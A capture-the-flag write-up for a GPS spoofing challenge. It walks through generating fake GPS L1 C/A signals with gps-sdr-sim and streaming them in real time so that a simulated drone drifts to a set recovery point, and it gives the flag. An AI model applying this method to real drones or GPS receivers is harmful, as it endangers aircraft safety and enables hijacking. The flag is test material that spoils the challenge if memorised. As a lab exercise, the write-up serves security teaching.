# Walk the False Line

| | |
|---|---|
| **Category** | Communication & RF |
| **Points** | 500 |
| **Solves** | 5 |

## Description

Based on your intel, Prismantir traced the enemy team to their hideout. This is a no-questions-asked contract, Ions will flow your way once the gig is closed, no need to know anything else. Apparently, they've been collecting some of our downed drones over time and made their own micro fleet to keep an eye out. Perfectly blended with our own. One such unit is currently holding position over the area. Your role is to make it check in at the recovery point long enough for the team to move in. We'll take it from there.

**RP: 36.124093, -115.275197 (+/- 100m)**

**Flag format:** `starpwn{[A-Za-z_]+}`

**Attachments:**
- `brdc1300.26n` — GPS broadcast ephemeris (RINEX nav)
- Web UI: `starpwn-147a501af55d-walk-the-false-line-0-0.chals.io`
- GPS RF input: `tcp:0.cloud.chals.io:<port>`
- Truth monitor: `tcp:0.cloud.chals.io:<port>`

**Hints:**
- The simulated RF input is GPS L1 C/A (1575.42 MHz) complex baseband: it accepts a continuous real-time stream of signed 16-bit little-endian interleaved I/Q samples (I0,Q0,I1,Q1...) at the sample rate advertised by the monitor. For timed alignment, the stream begins with SPWN1 scenario_t=YYYY/MM/DD,HH:MM:SS sample_rate=<sample_rate>\n, associating the first IQ sample with its GPS time.

## Solution

### Overview

This is a **GPS spoofing** challenge. The target drone is flying in autonomous mode, navigating via GPS. By injecting a fake GPS signal that gradually shifts the drone's perceived position toward the recovery point (RP), the drone's flight controller follows the spoofed coordinates without detecting the attack.

### Steps

**1. Identify active PRNs via Truth Monitor**

Connect to the Truth Monitor port to observe which GPS satellites (PRNs) the drone is currently tracking:

```bash
python3 connect_monitor.py

or

python3 truth_log.py <truth_port> -o truth_log.csv
```

For example,

{"type":"truth_monitor","version":1,"gps_time":"2026/05/10,12:00:10","scenario_seconds":10.0,"sample_rate":2600000,"location":{"lat":36.119343,"lon":-115.271067,"alt":800.0},"observables":[{"prn":1,"doppler_hz":358.007,"cn0_dbhz":43.5,"tracking_state":"locked"},{"prn":2,"doppler_hz":406.987,"cn0_dbhz":42.4,"tracking_state":"locked"},{"prn":7,"doppler_hz":186.222,"cn0_dbhz":41.3,"tracking_state":"locked"},{"prn":14,"doppler_hz":493.149,"cn0_dbhz":40.2,"tracking_state":"locked"},{"prn":15,"doppler_hz":155.416,"cn0_dbhz":39.1,"tracking_state":"locked"},{"prn":17,"doppler_hz":-1367.639,"cn0_dbhz":43.5,"tracking_state":"locked"},{"prn":19,"doppler_hz":-291.67,"cn0_dbhz":42.4,"tracking_state":"locked"},{"prn":20,"doppler_hz":423.763,"cn0_dbhz":41.3,"tracking_state":"locked"},{"prn":22,"doppler_hz":-474.556,"cn0_dbhz":40.2,"tracking_state":"locked"},{"prn":30,"doppler_hz":-1386.003,"cn0_dbhz":39.1,"tracking_state":"locked"}]}

Active PRNs in this session: **1, 2, 7, 14, 15, 17, 19, 20, 22, 30**

**2. Generate a session-specific RINEX nav file**

Receiver logs are available by clicking the antenna icon next to the GPS indicator in the Web UI, or by visiting:

```
https://starpwn-147a501af55d-walk-the-false-line-0-0.chals.io/receiver
```

```
Current receiver time: 29 min 19 s
New GPS NAV message received in channel 4: subframe 3 from satellite New GPS NAV message received in channel 2: subframe 3 from satellite GPS PRN 17 (Block IIR-M)
GPS PRN 14 (Block III)
New GPS NAV message received in channel 7: subframe 3 from satellite GPS PRN 20 (Block IIR)
New GPS NAV message received in channel 3: subframe 3 from satellite GPS PRN 15 (Block IIR-M)
New GPS NAV message received in channel 5: subframe 3 from satellite GPS PRN 19 (Block IIR)
New GPS NAV message received in channel 0: subframe 3 from satellite GPS PRN 01 (Block IIF)
New GPS NAV message received in channel 6: subframe 3 from satellite GPS PRN 07 (Block IIR-M)
New GPS NAV message received in channel 1: subframe 3 from satellite GPS PRN 02 (Block IIR)
[1m[32mPosition at 2026-May-10 12:29:00.000000 UTC using 7 observations is Lat = 36.119364196 [deg], Long = -115.271040384 [deg], Height = 789.778 [m][0m
[1m[32mVelocity: East: -0.062 [m/s], North: 0.028 [m/s], Up = -0.223 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:00.500000 UTC using 7 observations is Lat = 36.119363704 [deg], Long = -115.271045369 [deg], Height = 789.221 [m][0m
[1m[32mVelocity: East: -0.027 [m/s], North: 0.090 [m/s], Up = -0.066 [m/s][0m
Current receiver time: 29 min 20 s
[1m[32mPosition at 2026-May-10 12:29:01.000000 UTC using 7 observations is Lat = 36.119367063 [deg], Long = -115.271048682 [deg], Height = 789.099 [m][0m
[1m[32mVelocity: East: -0.062 [m/s], North: -0.013 [m/s], Up = -0.181 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:01.500000 UTC using 7 observations is Lat = 36.119364638 [deg], Long = -115.271046781 [deg], Height = 789.579 [m][0m
[1m[32mVelocity: East: 0.050 [m/s], North: -0.020 [m/s], Up = 0.069 [m/s][0m
Current receiver time: 29 min 21 s
[1m[32mPosition at 2026-May-10 12:29:02.000000 UTC using 7 observations is Lat = 36.119361553 [deg], Long = -115.271046992 [deg], Height = 789.169 [m][0m
[1m[32mVelocity: East: 0.069 [m/s], North: -0.113 [m/s], Up = 0.019 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:02.500000 UTC using 7 observations is Lat = 36.119363559 [deg], Long = -115.271040808 [deg], Height = 789.212 [m][0m
[1m[32mVelocity: East: 0.153 [m/s], North: 0.077 [m/s], Up = 0.106 [m/s][0m
Current receiver time: 29 min 22 s
[1m[32mPosition at 2026-May-10 12:29:03.000000 UTC using 7 observations is Lat = 36.119367503 [deg], Long = -115.271043459 [deg], Height = 789.209 [m][0m
[1m[32mVelocity: East: -0.054 [m/s], North: 0.169 [m/s], Up = 0.073 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:03.500000 UTC using 7 observations is Lat = 36.119363446 [deg], Long = -115.271044730 [deg], Height = 788.295 [m][0m
[1m[32mVelocity: East: 0.002 [m/s], North: -0.011 [m/s], Up = -0.180 [m/s][0m
Current receiver time: 29 min 23 s
[1m[32mPosition at 2026-May-10 12:29:04.000000 UTC using 7 observations is Lat = 36.119366031 [deg], Long = -115.271043910 [deg], Height = 789.626 [m][0m
[1m[32mVelocity: East: -0.023 [m/s], North: -0.067 [m/s], Up = -0.114 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:04.500000 UTC using 7 observations is Lat = 36.119362525 [deg], Long = -115.271045067 [deg], Height = 788.528 [m][0m
[1m[32mVelocity: East: -0.010 [m/s], North: -0.077 [m/s], Up = 0.061 [m/s][0m
Current receiver time: 29 min 24 s
[1m[32mPosition at 2026-May-10 12:29:05.000000 UTC using 7 observations is Lat = 36.119366344 [deg], Long = -115.271047473 [deg], Height = 788.813 [m][0m
[1m[32mVelocity: East: 0.065 [m/s], North: -0.144 [m/s], Up = -0.262 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:05.500000 UTC using 7 observations is Lat = 36.119367436 [deg], Long = -115.271041848 [deg], Height = 789.316 [m][0m
[1m[32mVelocity: East: -0.065 [m/s], North: 0.098 [m/s], Up = 0.135 [m/s][0m
Current receiver time: 29 min 25 s
New GPS NAV message received in channel 2: subframe 4 from satellite GPS PRN 17 (Block IIR-M)
New GPS NAV message received in channel 4: subframe 4 from satellite GPS PRN 14 (Block III)
New GPS NAV message received in channel 5: subframe 4 from satellite GPS PRN 19 (Block IIR)
New GPS NAV message received in channel 7: subframe 4 from satellite GPS PRN 20 (Block IIR)
New GPS NAV message received in channel 3: subframe 4 from satellite GPS PRN 15 (Block IIR-M)
New GPS NAV message received in channel 0: subframe 4 from satellite GPS PRN 01 (Block IIF)
New GPS NAV message received in channel 6: subframe 4 from satellite GPS PRN 07 (Block IIR-M)
New GPS NAV message received in channel 1: subframe 4 from satellite GPS PRN 02 (Block IIR)
[1m[32mPosition at 2026-May-10 12:29:06.000000 UTC using 7 observations is Lat = 36.119362819 [deg], Long = -115.271042943 [deg], Height = 788.801 [m][0m
[1m[32mVelocity: East: -0.019 [m/s], North: 0.144 [m/s], Up = 0.031 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:06.500000 UTC using 7 observations is Lat = 36.119363046 [deg], Long = -115.271042397 [deg], Height = 789.774 [m][0m
[1m[32mVelocity: East: 0.055 [m/s], North: -0.098 [m/s], Up = 0.237 [m/s][0m
Current receiver time: 29 min 26 s
[1m[32mPosition at 2026-May-10 12:29:07.000000 UTC using 7 observations is Lat = 36.119364887 [deg], Long = -115.271043336 [deg], Height = 789.429 [m][0m
[1m[32mVelocity: East: 0.043 [m/s], North: -0.112 [m/s], Up = -0.115 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:07.500000 UTC using 7 observations is Lat = 36.119365832 [deg], Long = -115.271048382 [deg], Height = 788.522 [m][0m
[1m[32mVelocity: East: -0.089 [m/s], North: 0.053 [m/s], Up = -0.008 [m/s][0m
Current receiver time: 29 min 27 s
[1m[32mPosition at 2026-May-10 12:29:08.000000 UTC using 7 observations is Lat = 36.119364856 [deg], Long = -115.271043868 [deg], Height = 789.213 [m][0m
[1m[32mVelocity: East: -0.014 [m/s], North: -0.100 [m/s], Up = 0.152 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:08.500000 UTC using 7 observations is Lat = 36.119362764 [deg], Long = -115.271045257 [deg], Height = 789.216 [m][0m
[1m[32mVelocity: East: 0.068 [m/s], North: -0.067 [m/s], Up = -0.235 [m/s][0m
Current receiver time: 29 min 28 s
[1m[32mPosition at 2026-May-10 12:29:09.000000 UTC using 7 observations is Lat = 36.119364948 [deg], Long = -115.271044085 [deg], Height = 789.141 [m][0m
[1m[32mVelocity: East: 0.005 [m/s], North: -0.255 [m/s], Up = 0.048 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:09.500000 UTC using 7 observations is Lat = 36.119366809 [deg], Long = -115.271039489 [deg], Height = 789.000 [m][0m
[1m[32mVelocity: East: -0.091 [m/s], North: 0.004 [m/s], Up = 0.155 [m/s][0m
Current receiver time: 29 min 29 s
[1m[32mPosition at 2026-May-10 12:29:10.000000 UTC using 7 observations is Lat = 36.119363807 [deg], Long = -115.271045013 [deg], Height = 788.854 [m][0m
[1m[32mVelocity: East: 0.005 [m/s], North: -0.151 [m/s], Up = -0.161 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:10.500000 UTC using 7 observations is Lat = 36.119360799 [deg], Long = -115.271044892 [deg], Height = 789.100 [m][0m
[1m[32mVelocity: East: -0.037 [m/s], North: 0.122 [m/s], Up = 0.123 [m/s][0m
Current receiver time: 29 min 30 s
[1m[32mPosition at 2026-May-10 12:29:11.000000 UTC using 7 observations is Lat = 36.119368720 [deg], Long = -115.271043564 [deg], Height = 788.878 [m][0m
[1m[32mVelocity: East: -0.163 [m/s], North: 0.061 [m/s], Up = 0.469 [m/s][0m
[1m[32mPosition at 2026-May-10 12:29:11.500000 UTC using 7 observations is Lat = 36.119365746 [deg], Long = -115.271045726 [deg], Height = 788.053 [m][0m
[1m[32mVelocity: East: -0.087 [m/s], North: 0.096 [m/s], Up = 0.081 [m/s][0m
Current receiver time: 29 min 31 s
```

The receiver page reports the satellites currently tracked and the computed navigation solution, providing the definitive verification that the spoofed IQ signal is being received correctly.

**The set of satellites actually used by the drone's GPS receiver may differ between challenge instances and does not necessarily include every satellite advertised by the Truth Monitor. Therefore, the filtered RINEX navigation file should be generated based on the satellites actually tracked by the receiver.**

For example, if the receiver is currently tracking PRNs **1, 2, 7, 14, 15, 17, 19, 20**, generate:

```
brdc1300_rx_prn_1_2_7_14_15_17_19_20.26n
```

**3. Generate spoofed GPS IQ samples with gps-sdr-sim**

Use [gps-sdr-sim](https://github.com/osqzss/gps-sdr-sim) to generate a GPS L1 C/A baseband IQ file that simulates movement from the drone's current holding position to the recovery point:

```bash
# motion_hold15_nw700_hold120_600s.csv describes the spoofed trajectory:
# - Hold at current position for 15s
# - Move NW 700m over time
# - Hold at target for 120s
# Total: 600s scenario

gps-sdr-sim -e brdc1300_rx_prn_1_2_7_14_15_17_19_20.26n \
            -u motion_hold15_nw700_hold120_600s.csv \
            -t 2026/05/10, 12:16:35 \
            -s 2600000 \
            -b 16 \
            -o gpssim.bin
```

The `gpssim.bim` file is not being uploaded because it exceeds 3 GB in size. It is recommended that you build it yourself.

**4. Stream the IQ signal to the RF input port**

Send the generated IQ file to the challenge's RF input port in real time, with the correct SPWN1 header specifying the scenario start time and sample rate:

```bash
python3 stream_iq6.py gpssim.bin 0.cloud.chals.io <rf_port> \
    2026/05/10,12:16:35 2600000 10
```

The streamer sends:
```
SPWN1 scenario_t=2026/05/10,12:16:35 sample_rate=2600000\n
<raw signed int16 little-endian I/Q samples>
```

The `gpssim.bin` generation time must match the transmission time and be later than the current truth monitor time. Set the target time 1–2 minutes ahead (or 4–5 minutes if necessary), and begin transmission 2–3 seconds before the truth monitor reaches that time.

**5. Monitor the drone's position**

Watch the Web UI — the drone's GPS fix shifts from its holding position toward `36.124093, -115.275197`. The flight controller in AUTO mode follows the spoofed waypoint as if it were real.

**6. Flag appears at the recovery point**

Once the drone enters the ±100m radius around the RP, the ArduPilot console outputs the flag repeatedly:

![GNU Radio](/Communication_and_RF/Walk_the_False_Line/images/flag.png)

```
starpwn{autonomous_until_someone_speaks_louder}
```

### Key Files

| File | Description |
|------|-------------|
| `brdc1300.26n` | Original GPS broadcast ephemeris (provided) |
| `brdc1300_rx_prn_1_2_7_14_15_17_19_20.26n` | Filtered RINEX for active PRNs |
| `motion_hold15_nw700_hold120_600s.csv` | Spoofed trajectory CSV for gps-sdr-sim |
| `gpssim.bin` | Generated GPS L1 C/A IQ samples |
| `stream_iq6.py` | Real-time TCP streamer for IQ data |
| `truth_log.py` | Truth monitor client for PRN observation with file saving |
| `connect_monitor.py` | Truth monitor client for PRN observation |

## Flag

```
starpwn{autonomous_until_someone_speaks_louder}
```
